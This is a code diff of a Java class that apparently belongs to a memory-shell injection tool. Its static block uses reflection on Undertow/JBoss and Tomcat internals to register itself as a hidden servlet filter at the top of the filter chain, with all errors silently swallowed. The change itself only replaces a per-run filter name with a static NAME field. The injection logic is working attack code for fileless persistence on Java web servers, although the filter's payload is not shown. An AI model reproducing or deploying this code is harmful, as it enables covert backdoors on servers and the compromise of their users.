@@ -15,10 +15,11 @@ public class JBFMSFromContext implements Filter {
 
 	public static String pattern;
 
+	public static String NAME;
+
 	static {
 		try {
-			String filterName = String.valueOf(System.nanoTime());
-			Object req        = javax.security.jacc.PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
+			Object req = javax.security.jacc.PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
 
 			try {
 				Class.forName("io.undertow.servlet.spec.HttpServletRequestImpl");
@@ -26,7 +27,7 @@ public class JBFMSFromContext implements Filter {
 				Object deploymentInfo = getFieldValue(context, "deploymentInfo");
 				Map    filters        = (Map) getMethodAndInvoke(deploymentInfo, "getFilters", new Class[]{}, new Object[]{});
 
-				if (!filters.containsKey(filterName)) {
+				if (!filters.containsKey(NAME)) {
 					Class clazz                = JBFMSFromContext.class;
 					Class filterInfoClass      = Class.forName("io.undertow.servlet.api.FilterInfo");
 					Class instanceFactoryClass = Class.forName("io.undertow.servlet.api.InstanceFactory");
@@ -39,7 +40,7 @@ public class JBFMSFromContext implements Filter {
 					Constructor constructor = filterInfoClass.getDeclaredConstructor(
 							new Class[]{String.class, Class.class, instanceFactoryClass});
 					constructor.setAccessible(true);
-					Object filter = constructor.newInstance(new Object[]{filterName, clazz, factory});
+					Object filter = constructor.newInstance(new Object[]{NAME, clazz, factory});
 
 					getMethodAndInvoke(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filter});
 
@@ -52,7 +53,7 @@ public class JBFMSFromContext implements Filter {
 							"addFilter", new Class[]{filterInfoClass}, new Object[]{filter});
 					getMethodAndInvoke(deploymentInfo, "insertFilterUrlMapping",
 							new Class[]{int.class, String.class, String.class, DispatcherType.class},
-							new Object[]{0, filterName, pattern, DispatcherType.REQUEST});
+							new Object[]{0, NAME, pattern, DispatcherType.REQUEST});
 				}
 			} catch (Exception ignored) {
 				Object standardContext = null;
@@ -76,7 +77,7 @@ public class JBFMSFromContext implements Filter {
 
 				Class  filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
 				Object filterDef      = filterDefClass.newInstance();
-				getMethodAndInvoke(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+				getMethodAndInvoke(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
 				getMethodAndInvoke(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filter.getClass().getName()});
 				getMethodAndInvoke(filterDef, "setFilter", new Class[]{Filter.class}, new Object[]{filter});
 				getMethodAndInvoke(standardContext, "addFilterDef", new Class[]{filterDefClass}, new Object[]{filterDef});
@@ -85,7 +86,7 @@ public class JBFMSFromContext implements Filter {
 				Object filterMap      = filterMapClass.newInstance();
 
 				getMethodAndInvoke(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{pattern});
-				getMethodAndInvoke(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+				getMethodAndInvoke(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
 				getMethodAndInvoke(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
 
 				Field fieldMaps = standardContext.getClass().getDeclaredField("filterMaps");
@@ -120,7 +121,7 @@ public class JBFMSFromContext implements Filter {
 				Field field = config.getDeclaredField("filter");
 				field.setAccessible(true);
 				field.set(apacheConfig, filter);
-				filterConfigs.put(filterName, apacheConfig);
+				filterConfigs.put(NAME, apacheConfig);
 			}
 		} catch (Exception ignored) {
 		}
